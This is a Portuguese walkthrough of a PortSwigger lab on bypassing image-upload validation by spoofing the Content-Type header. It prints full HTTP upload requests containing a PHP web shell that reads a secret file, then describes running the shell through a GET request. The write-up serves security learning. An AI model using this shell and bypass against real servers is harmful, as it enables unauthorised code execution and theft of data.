
## Descrição do Lab

Este laboratório contém uma função vulnerável de upload de imagens. Ela tenta impedir que usuários enviem tipos de arquivos inesperados, porém depende da validação de entradas que podem ser manipuladas pelo usuário.
Para resolver o laboratório, faça o upload de um web shell PHP básico e utilize-o para exfiltrar o conteúdo do arquivo /home/carlos/secret.
Envie esse segredo usando o botão disponível no banner do laboratório.
Você pode fazer login na sua própria conta usando as seguintes credenciais: `wiener:peter`

A nossa missão é capturar uma flag que está no arquivo `/home/carlos/secret`.

<img width="1366" height="768" alt="4" src="https://github.com/user-attachments/assets/ffdc5a0b-ec1c-4857-91d0-aa487f83ec35" />



## Intercepção das requests and responses 

- Realizei o upload de um arquivo com a extensão `.php` e interceptei a requisição do tipo `POST`

<img width="1366" height="768" alt="5" src="https://github.com/user-attachments/assets/4f749fd7-df7a-455f-9fa3-231c807bd21d" />

## Erro da aplicação

- Aplicação apresentou um erro, pois a extensão do arquivo transferido não é aceito pela aplicação.
- Esse erro, pode nos levar a uma técnica de bypass - (Manipulação do header Content-Type).
- Aguarde...

<img width="1366" height="768" alt="6" src="https://github.com/user-attachments/assets/540d42e2-fa3c-47e8-8eb5-4d17f5750499" />

## Caido - Replay 

- A foto abaixo é o passo à passo, de como enviar solicitações ou respostas para o replay.
-  Replay um recurso da ferramenta Caido para manipular campos nos **cabeçalhos http**
-  Utilizei esse recurso para analisar, o comportamento da aplicação quando determinados campos são modificados.

  
<img width="1366" height="768" alt="7" src="https://github.com/user-attachments/assets/4632b6cd-fd35-4796-b783-e9db857b8b5c" />


## Manipulando - Caido - Replay

- Parte de cima da requisição
<img width="1366" height="768" alt="8" src="https://github.com/user-attachments/assets/92e17cec-ca92-492e-8fc5-934969296225" />


- Parte de baixo da requisição.

<img width="1366" height="768" alt="9" src="https://github.com/user-attachments/assets/11cfd56a-4859-477d-969b-7e7ae893d459" />
Requisição original  - Imagem 7 e 8 
- Eu  modifiquei os campos `Host` e `User-Agent` para não deixar publico informações relacionado ao meu `Traffic Network`
- O restante dos campos permanece inalterado.

 ````
POST /my-account/avatar HTTP/1.1
Host: **************************.web-security-academy.net
Cookie: session=l0L1fK1UXAlP68VY6pyEhGjz4uzeGU1v
User-Agent: ###########################################
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://************************.web-security-academy.net/my-account?id=wiener
Content-Type: multipart/form-data; boundary=----geckoformboundarye2d5cc6534247df9a1f35f8f255c4ad2
Content-Length: 531
Origin: https://********************.web-security-academy.net
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

------geckoformboundarye2d5cc6534247df9a1f35f8f255c4ad2
Content-Disposition: form-data; name="avatar"; filename="3xpl0it.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>


------geckoformboundarye2d5cc6534247df9a1f35f8f255c4ad2
Content-Disposition: form-data; name="user"

wiener
------geckoformboundarye2d5cc6534247df9a1f35f8f255c4ad2
Content-Disposition: form-data; name="csrf"

iHFy3uVSDLCl7E6R0OMED9IFQNMgBJq9
------geckoformboundarye2d5cc6534247df9a1f35f8f255c4ad2--

````



Para isso usando o replay - Imagem 9:

- Observe o campo `Content-Type:` das duas solicitações e compare a resposta da primeira solicitação com a resposta da última solicitação.
- Eu  modifiquei os campos `Host` e `User-Agent` para não deixar publico informações relacionado ao meu `Traffic Network`.
- O restante dos campos permanece inalterado.  

````

POST /my-account/avatar HTTP/1.1
Host: 0a7300c20370f723866f1d420080007f.web-security-academy.net
Cookie: session=l0L1fK1UXAlP68VY6pyEhGjz4uzeGU1v
User-Agent: ####################################################
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://*************************.web-security-academy.net/my-account?id=wiener
Content-Type: multipart/form-data; boundary=----geckoformboundarye2d5cc6534247df9a1f35f8f255c4ad2
Content-Length: 531
Origin: https://***.web-security-academy.net
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

------geckoformboundarye2d5cc6534247df9a1f35f8f255c4ad2
Content-Disposition: form-data; name="avatar"; filename="3xpl0it.php"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>


------geckoformboundarye2d5cc6534247df9a1f35f8f255c4ad2
Content-Disposition: form-data; name="user"

wiener
------geckoformboundarye2d5cc6534247df9a1f35f8f255c4ad2
Content-Disposition: form-data; name="csrf"

iHFy3uVSDLCl7E6R0OMED9IFQNMgBJq9
------geckoformboundarye2d5cc6534247df9a1f35f8f255c4ad2--

````
- Como o arquivo já foi uploaded, precisei executar o arquivo malicioso para extrair a flag.
- Voltei no histórico de http para selecionar uma requisição do tipo `GET` para enviar ao replay.

## A selecionar requisição.
- PASSO 1
  <img width="1366" height="768" alt="10" src="https://github.com/user-attachments/assets/9fcb3d5e-ca6b-479e-a384-9623864875fd" />

- PASSO 2

<img width="1366" height="768" alt="11" src="https://github.com/user-attachments/assets/407bd619-2871-442e-8eb8-c4eba0b89856" />

## Sending Request 
- Envei uma solicitação com o metodo `GET` para que o servidor executar o conteúdo do arquivo para capturar a flag e retornar na resposta.

<img width="1366" height="768" alt="12" src="https://github.com/user-attachments/assets/e63464f2-4e3c-4172-952f-3fed6b056e3e" />

## Submeti a flag & Final 

- <img width="1366" height="768" alt="13" src="https://github.com/user-attachments/assets/c1a90777-62ab-490e-a189-e2a2fad8c546" />

>
>

-  <img width="1366" height="768" alt="14" src="https://github.com/user-attachments/assets/5fc755d7-2435-4de6-adca-8bf91ed3a668" />

## Aprendizado:

Uma técnica comum utilizada por sites para validar uploads consiste em analisar o cabeçalho Content-Type enviado na requisição e verificar se ele corresponde ao tipo MIME esperado. Em plataformas que aceitam apenas imagens, por exemplo, costuma-se restringir o envio a tipos como image/jpeg ou image/png. Contudo, essa abordagem se torna frágil quando o servidor confia cegamente nesse cabeçalho. Sem uma verificação adicional para confirmar se o conteúdo do arquivo realmente corresponde ao tipo MIME declarado, essa proteção pode ser facilmente burlada com ferramentas como o Caido Replay.

Créditos:
`https://portswigger.net/web-security/learning-paths/`



